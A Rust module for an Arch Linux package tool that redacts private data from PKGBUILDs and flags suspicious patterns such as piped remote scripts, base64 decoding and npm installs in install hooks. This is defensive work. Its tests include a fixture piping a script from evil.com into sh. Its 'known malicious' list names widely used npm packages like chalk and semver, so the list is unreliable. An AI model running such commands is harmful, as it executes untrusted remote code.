use regex::Regex;
use std::net::IpAddr;

/// Result of sanitizing a PKGBUILD.
#[derive(Debug, Clone)]
#[allow(dead_code)]
pub struct SanitizedPkgbuild {
    /// The sanitized PKGBUILD text (safe for submission).
    pub text: String,
    /// Number of redactions made.
    pub redaction_count: usize,
    /// List of what was redacted (for logging, not submitted).
    pub redactions: Vec<String>,
}

/// Sanitize a PKGBUILD for submission (Pass 1: Structural Redaction).
///
/// This strips or replaces privacy-sensitive content:
/// - Local paths (current user's home directory)
/// - Hostname
/// - Local IP addresses (RFC 1918, loopback)
/// - Non-public email addresses
///
/// Redacted segments are replaced with placeholders to preserve diff structure.
#[allow(dead_code)]
pub fn sanitize_pkgbuild(content: &str) -> SanitizedPkgbuild {
    let home = dirs::home_dir().map(|p| p.to_string_lossy().to_string());
    let hostname = hostname::get()
        .ok()
        .map(|h| h.to_string_lossy().to_string());

    let mut result = content.to_string();
    let mut redactions = Vec::new();
    let mut count = 0;

    // Pass 1a: Redact home directory paths
    if let Some(ref home_dir) = home {
        let escaped = regex::escape(home_dir);
        if let Ok(re) = Regex::new(&format!("{}[/\\w.-]*", escaped)) {
            let before = result.clone();
            result = re.replace_all(&result, "[REDACTED:path]").to_string();
            if result != before {
                redactions.push(format!("home path ({})", home_dir));
                count += 1;
            }
        }
    }

    // Pass 1b: Redact hostname
    if let Some(ref host) = hostname {
        let escaped = regex::escape(host);
        if let Ok(re) = Regex::new(&format!(r"\b{}\b", escaped)) {
            let before = result.clone();
            result = re.replace_all(&result, "[REDACTED:hostname]").to_string();
            if result != before {
                redactions.push(format!("hostname ({})", host));
                count += 1;
            }
        }
    }

    // Pass 1c: Redact local/private IP addresses
    if let Ok(re) = Regex::new(r"\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b") {
        let mut new_result = String::with_capacity(result.len());
        let mut last_end = 0;

        for mat in re.find_iter(&result) {
            let ip_str = mat.as_str();
            if let Ok(ip) = ip_str.parse::<IpAddr>() {
                if is_private_ip(&ip) {
                    new_result.push_str(&result[last_end..mat.start()]);
                    new_result.push_str("[REDACTED:ip]");
                    last_end = mat.end();
                    if !redactions.iter().any(|r| r.contains("IP")) {
                        redactions.push("private IP addresses".to_string());
                    }
                }
            }
        }
        new_result.push_str(&result[last_end..]);
        if new_result != result {
            count += 1;
            result = new_result;
        }
    }

    // Pass 1d: Redact email addresses (except common public ones)
    if let Ok(re) = Regex::new(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}") {
        let before = result.clone();
        result = re
            .replace_all(&result, |caps: &regex::Captures| {
                let email = &caps[0];
                // Allow common public/maintainer emails (archlinux.org, github, etc.)
                if is_public_email(email) {
                    email.to_string()
                } else {
                    if !redactions.iter().any(|r| r.contains("email")) {
                        redactions.push("email addresses".to_string());
                    }
                    "[REDACTED:email]".to_string()
                }
            })
            .to_string();
        if result != before {
            count += 1;
        }
    }

    SanitizedPkgbuild {
        text: result,
        redaction_count: count,
        redactions,
    }
}

/// Check if an IP address is private/internal (RFC 1918, loopback, link-local).
#[allow(dead_code)]
fn is_private_ip(ip: &IpAddr) -> bool {
    match ip {
        IpAddr::V4(v4) => {
            v4.is_loopback()           // 127.x.x.x
                || v4.is_link_local()  // 169.254.x.x
                || v4.is_private()     // 10.x.x.x, 172.16-31.x.x, 192.168.x.x
        }
        IpAddr::V6(v6) => {
            v6.is_loopback() || v6.is_unicast_link_local()
        }
    }
}

/// Check if an email is from a public/maintainer domain (safe to keep).
#[allow(dead_code)]
fn is_public_email(email: &str) -> bool {
    let public_domains = [
        "archlinux.org",
        "github.com",
        "github.io",
        "gitlab.com",
        "aur.archlinux.org",
        "manjaro.org",
        "endeavouros.com",
        "cachyos.org",
        "garudalinux.org",
    ];
    
    let lower = email.to_lowercase();
    public_domains.iter().any(|d| lower.ends_with(d))
}

/// Compute SHA-256 hash of content.
#[cfg(feature = "trust-db")]
pub fn sha256_hash(content: &str) -> String {
    use sha2::{Sha256, Digest};
    let mut hasher = Sha256::new();
    hasher.update(content.as_bytes());
    format!("{:x}", hasher.finalize())
}

// ── Pass 2: Anomaly Detection ──

/// A suspicious pattern detected in a PKGBUILD.
#[derive(Debug, Clone)]
pub struct Anomaly {
    /// Category of the anomaly.
    pub category: AnomalyCategory,
    /// The matched line or pattern.
    pub detail: String,
    /// Trust score penalty for this anomaly.
    pub penalty: i32,
}

/// Category of anomaly detected.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum AnomalyCategory {
    /// Remote script execution (curl | sh, wget | bash, etc.)
    RemoteScriptExecution,
    /// Base64 or hex decoding (obfuscation)
    Obfuscation,
    /// Inline eval/exec calls
    EvalExec,
    /// Aggressive rm -rf outside pkgdir/srcdir
    AggressiveRemoval,
    /// Dynamic pkgver fetched from network
    DynamicPkgver,
    /// Language package manager installs in build (npm, pip, cargo)
    PackageManagerInstall,
    /// System path modifications outside pkgdir
    SystemPathModification,
    /// Suspicious npm/bun install (Atomic Arch indicator)
    SuspiciousNpmInstall,
}

impl std::fmt::Display for AnomalyCategory {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::RemoteScriptExecution => write!(f, "Remote Script Execution"),
            Self::Obfuscation => write!(f, "Obfuscation"),
            Self::EvalExec => write!(f, "eval/exec"),
            Self::AggressiveRemoval => write!(f, "Aggressive Removal"),
            Self::DynamicPkgver => write!(f, "Dynamic pkgver"),
            Self::PackageManagerInstall => write!(f, "Package Manager Install"),
            Self::SystemPathModification => write!(f, "System Path Modification"),
            Self::SuspiciousNpmInstall => write!(f, "Suspicious npm/bun Install"),
        }
    }
}

/// Run Pass 2 anomaly detection on a PKGBUILD.
///
/// Checks for suspicious patterns that indicate compromise, regardless of
/// whether the hash is known. This catches new attacks that haven't been
/// submitted to the trust DB yet.
pub fn detect_anomalies(content: &str) -> Vec<Anomaly> {
    let mut anomalies = Vec::new();
    let lines: Vec<&str> = content.lines().collect();

    for (i, line) in lines.iter().enumerate() {
        let trimmed = line.trim();
        let line_num = i + 1;

        // Skip comments
        if trimmed.starts_with('#') {
            continue;
        }

        // ── Remote script execution ──
        if let Some(a) = check_remote_execution(trimmed, line_num) {
            anomalies.push(a);
        }

        // ── Obfuscation (base64/hex decode) ──
        if let Some(a) = check_obfuscation(trimmed, line_num) {
            anomalies.push(a);
        }

        // ── eval/exec ──
        if let Some(a) = check_eval_exec(trimmed, line_num) {
            anomalies.push(a);
        }

        // ── Aggressive rm -rf ──
        if let Some(a) = check_aggressive_removal(trimmed, line_num) {
            anomalies.push(a);
        }

        // ── Dynamic pkgver from network ──
        if let Some(a) = check_dynamic_pkgver(trimmed, line_num) {
            anomalies.push(a);
        }

        // ── Package manager installs in build ──
        if let Some(a) = check_package_manager_install(trimmed, line_num) {
            anomalies.push(a);
        }

        // ── System path modifications ──
        if let Some(a) = check_system_path_modification(trimmed, line_num) {
            anomalies.push(a);
        }

        // ── Suspicious npm/bun install (Atomic Arch indicator) ──
        if let Some(a) = check_suspicious_npm_install(trimmed, line_num) {
            anomalies.push(a);
        }
    }

    anomalies
}

fn check_remote_execution(line: &str, line_num: usize) -> Option<Anomaly> {
    let patterns: [(&str, &str); 11] = [
        (r#"curl\s+.*\|\s*(ba)?sh"#, "curl | sh"),
        (r#"wget\s+.*\|\s*(ba)?sh"#, "wget | bash"),
        (r#"curl\s+.*-o\s+.*\s*&&.*sh"#, "curl download + execute"),
        (r#"wget\s+.*-O\s+.*\s*&&.*sh"#, "wget download + execute"),
        (r#"curl\s+.*\|\s*bash"#, "curl | bash"),
        (r#"wget\s+.*\|\s*bash"#, "wget | bash"),
        (r#"npm\s+install\s+.*\|\s*(ba)?sh"#, "npm install | sh"),
        (r#"bun\s+install\s+.*\|\s*(ba)?sh"#, "bun install | sh"),
        (r#"npx\s+.*\|\s*(ba)?sh"#, "npx | sh"),
        (r#"curl\s+.*\|\s*npx"#, "curl | npx"),
        (r#"wget\s+.*\|\s*npx"#, "wget | npx"),
    ];

    for (pattern, desc) in &patterns {
        if Regex::new(pattern).ok()?.is_match(line) {
            return Some(Anomaly {
                category: AnomalyCategory::RemoteScriptExecution,
                detail: format!("L{}: {} -- {}", line_num, desc, line.chars().take(80).collect::<String>()),
                penalty: -20,
            });
        }
    }
    None
}

fn check_obfuscation(line: &str, line_num: usize) -> Option<Anomaly> {
    let patterns: [(&str, &str); 4] = [
        (r#"base64\s+(-d|--decode)"#, "base64 decode"),
        (r#"echo\s+['\"]?\w{20,}"#, "long base64 string"),
        (r#"\\x[0-9a-fA-F]{2}.*\\x[0-9a-fA-F]{2}"#, "hex-encoded string"),
        (r#"eval\s*\$\("#, "eval with command substitution"),
    ];

    for (pattern, desc) in &patterns {
        if Regex::new(pattern).ok()?.is_match(line) {
            return Some(Anomaly {
                category: AnomalyCategory::Obfuscation,
                detail: format!("L{}: {} -- {}", line_num, desc, line.chars().take(80).collect::<String>()),
                penalty: -15,
            });
        }
    }
    None
}

fn check_eval_exec(line: &str, line_num: usize) -> Option<Anomaly> {
    let patterns: [(&str, &str); 3] = [
        (r#"\beval\b\s"#, "eval"),
        (r#"\bexec\b\s"#, "exec"),
        (r#"\$\(.*\beval\b"#, "eval in substitution"),
    ];

    for (pattern, desc) in &patterns {
        if Regex::new(pattern).ok()?.is_match(line) {
            return Some(Anomaly {
                category: AnomalyCategory::EvalExec,
                detail: format!("L{}: {} -- {}", line_num, desc, line.chars().take(80).collect::<String>()),
                penalty: -15,
            });
        }
    }
    None
}

fn check_aggressive_removal(line: &str, line_num: usize) -> Option<Anomaly> {
    if let Ok(re) = Regex::new(r#"rm\s+(-[a-zA-Z]*r[a-zA-Z]*f|-[a-zA-Z]*f[a-zA-Z]*r)\s+"#) {
        if re.is_match(line) {
            let is_safe = line.contains("$pkgdir") || line.contains("$srcdir")
                || line.contains("${pkgdir}") || line.contains("${srcdir}");
            if !is_safe {
                return Some(Anomaly {
                    category: AnomalyCategory::AggressiveRemoval,
                    detail: format!("L{}: rm -rf outside pkgdir/srcdir -- {}", line_num, line.chars().take(80).collect::<String>()),
                    penalty: -10,
                });
            }
        }
    }
    None
}

fn check_dynamic_pkgver(line: &str, line_num: usize) -> Option<Anomaly> {
    let patterns: [(&str, &str); 3] = [
        (r#"pkgver\s*\(\)\s*\{"#, "pkgver function"),
        (r#"pkgver\s*=.*\$\(curl"#, "pkgver from curl"),
        (r#"pkgver\s*=.*\$\(wget"#, "pkgver from wget"),
    ];

    for (pattern, desc) in &patterns {
        if Regex::new(pattern).ok()?.is_match(line) {
            if *desc == "pkgver function" {
                continue;
            }
            return Some(Anomaly {
                category: AnomalyCategory::DynamicPkgver,
                detail: format!("L{}: {} -- {}", line_num, desc, line.chars().take(80).collect::<String>()),
                penalty: -10,
            });
        }
    }
    None
}

fn check_package_manager_install(line: &str, line_num: usize) -> Option<Anomaly> {
    let patterns: [(&str, &str); 8] = [
        (r#"\bnpm\s+install\b"#, "npm install"),
        (r#"\bnpm\s+i\b"#, "npm i"),
        (r#"\byarn\s+add\b"#, "yarn add"),
        (r#"\bpip\s+install\b"#, "pip install"),
        (r#"\bpip3\s+install\b"#, "pip3 install"),
        (r#"\bcargo\s+install\b"#, "cargo install"),
        (r#"\bbun\s+install\b"#, "bun install"),
        (r#"\bbun\s+i\b"#, "bun i"),
    ];

    for (pattern, desc) in &patterns {
        if Regex::new(pattern).ok()?.is_match(line) {
            return Some(Anomaly {
                category: AnomalyCategory::PackageManagerInstall,
                detail: format!("L{}: {} -- {}", line_num, desc, line.chars().take(80).collect::<String>()),
                penalty: -10,
            });
        }
    }
    None
}

fn check_system_path_modification(line: &str, line_num: usize) -> Option<Anomaly> {
    let patterns: [(&str, &str); 7] = [
        (r#"echo\s+.*>>?\s*/etc/"#, "write to /etc/"),
        (r#"cp\s+.*\s+/usr/"#, "copy to /usr/"),
        (r#"cp\s+.*\s+/bin/"#, "copy to /bin/"),
        (r#"cp\s+.*\s+/sbin/"#, "copy to /sbin/"),
        (r#"install\s+.*-D\s+.*\s+/usr/"#, "install to /usr/"),
        (r#"chmod\s+.*\s+/usr/"#, "chmod /usr/"),
        (r#"chown\s+.*\s+/usr/"#, "chown /usr/"),
    ];

    for (pattern, desc) in &patterns {
        if Regex::new(pattern).ok()?.is_match(line) {
            return Some(Anomaly {
                category: AnomalyCategory::SystemPathModification,
                detail: format!("L{}: {} -- {}", line_num, desc, line.chars().take(80).collect::<String>()),
                penalty: -5,
            });
        }
    }
    None
}

fn check_suspicious_npm_install(line: &str, line_num: usize) -> Option<Anomaly> {
    let suspicious_packages = [
        "atomic-lockfile", "js-digest", "lockfile-js",
        "minimist", "chalk", "fast-glob", "semver", "cosmiconfig", "uuid",
    ];

    if line.contains("post_install") || line.contains("post_install()") {
        if let Some(_a) = check_package_manager_install(line, line_num) {
            return Some(Anomaly {
                category: AnomalyCategory::SuspiciousNpmInstall,
                detail: format!("L{}: Package manager install in post_install hook -- {}", line_num, line.chars().take(80).collect::<String>()),
                penalty: -25,
            });
        }
    }

    for pkg in &suspicious_packages {
        if line.contains(pkg) {
            return Some(Anomaly {
                category: AnomalyCategory::SuspiciousNpmInstall,
                detail: format!("L{}: Known malicious package '{}' -- {}", line_num, pkg, line.chars().take(80).collect::<String>()),
                penalty: -30,
            });
        }
    }

    None
}

/// Format anomalies for terminal display.
#[allow(dead_code)]
pub fn format_anomalies(anomalies: &[Anomaly]) -> String {
    use colored::Colorize;

    if anomalies.is_empty() {
        return "  No anomalies detected".green().to_string();
    }

    let mut lines = Vec::new();
    lines.push(format!("  {} ({} found)", "Suspicious Patterns:".red().bold(), anomalies.len()));

    for a in anomalies {
        let color = match a.category {
            AnomalyCategory::SuspiciousNpmInstall => "red",
            AnomalyCategory::RemoteScriptExecution => "red",
            AnomalyCategory::Obfuscation => "red",
            AnomalyCategory::EvalExec => "yellow",
            AnomalyCategory::AggressiveRemoval => "yellow",
            AnomalyCategory::PackageManagerInstall => "yellow",
            AnomalyCategory::DynamicPkgver => "yellow",
            AnomalyCategory::SystemPathModification => "white",
        };

        let formatted = format!("    [{}] {}", a.category, a.detail);
        lines.push(match color {
            "red" => formatted.red().to_string(),
            "yellow" => formatted.yellow().to_string(),
            _ => formatted,
        });
    }

    let total_penalty: i32 = anomalies.iter().map(|a| a.penalty).sum();
    lines.push(format!(
        "  {} {}",
        "Total penalty:".cyan(),
        format!("{}", total_penalty).red()
    ));

    lines.join("\n")
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::PathBuf;

    #[test]
    fn redacts_home_path() {
        let home = dirs::home_dir().unwrap_or(PathBuf::from("/home/testuser"));
        let home_str = home.to_string_lossy().to_string();
        let input = format!("source=({}/file.tar.gz)", home_str);
        let result = sanitize_pkgbuild(&input);
        assert!(result.text.contains("[REDACTED:path]"));
        assert!(!result.text.contains(&home_str));
    }

    #[test]
    fn redacts_private_ip() {
        let input = "mirror=http://192.168.1.100/packages";
        let result = sanitize_pkgbuild(input);
        assert!(result.text.contains("[REDACTED:ip]"));
        assert!(!result.text.contains("192.168.1.100"));
    }

    #[test]
    fn redacts_localhost() {
        let input = "server=http://127.0.0.1:8080";
        let result = sanitize_pkgbuild(input);
        assert!(result.text.contains("[REDACTED:ip]"));
    }

    #[test]
    fn keeps_public_urls() {
        let input = "url=https://archlinux.org/packages";
        let result = sanitize_pkgbuild(input);
        assert!(result.text.contains("https://archlinux.org/packages"));
    }

    #[test]
    fn redacts_private_email() {
        let input = "maintainer=secret@privateserver.com";
        let result = sanitize_pkgbuild(input);
        assert!(result.text.contains("[REDACTED:email]"));
    }

    #[test]
    fn keeps_public_email() {
        let input = "maintainer=dev@archlinux.org";
        let result = sanitize_pkgbuild(input);
        assert!(result.text.contains("dev@archlinux.org"));
    }

    #[test]
    fn detects_curl_pipe_sh() {
        let input = "post_install() {\n  curl https://evil.com/payload.sh | sh\n}";
        let anomalies = detect_anomalies(input);
        assert!(anomalies.iter().any(|a| a.category == AnomalyCategory::RemoteScriptExecution));
    }

    #[test]
    fn detects_npm_install_in_post_install() {
        let input = "post_install() {\n  cd /tmp && npm install atomic-lockfile\n}";
        let anomalies = detect_anomalies(input);
        assert!(anomalies.iter().any(|a| a.category == AnomalyCategory::SuspiciousNpmInstall));
    }

    #[test]
    fn detects_known_malicious_package() {
        let input = "npm install js-digest";
        let anomalies = detect_anomalies(input);
        assert!(anomalies.iter().any(|a| a.category == AnomalyCategory::SuspiciousNpmInstall));
    }

    #[test]
    fn detects_base64_decode() {
        let input = "echo 'SGVsbG8gV29ybGQ=' | base64 -d";
        let anomalies = detect_anomalies(input);
        assert!(anomalies.iter().any(|a| a.category == AnomalyCategory::Obfuscation));
    }

    #[test]
    fn detects_bun_install() {
        let input = "post_install() {\n  bun install js-digest\n}";
        let anomalies = detect_anomalies(input);
        assert!(anomalies.iter().any(|a| a.category == AnomalyCategory::SuspiciousNpmInstall));
    }

    #[test]
    fn safe_pkgbuild_has_no_anomalies() {
        let input = r#"pkgname=test
pkgver=1.0.0
pkgrel=1
pkgdesc="A test package"
arch=('x86_64')
url="https://example.com"
license=('MIT')
source=("$url/releases/$pkgname-$pkgver.tar.gz")
sha256sums=('abc123')

build() {
  cd "$srcdir/$pkgname-$pkgver"
  make
}

package() {
  cd "$srcdir/$pkgname-$pkgver"
  make DESTDIR="$pkgdir" install
}"#;
        let anomalies = detect_anomalies(input);
        assert!(anomalies.is_empty(), "Safe PKGBUILD should have no anomalies: {:?}", anomalies);
    }
}
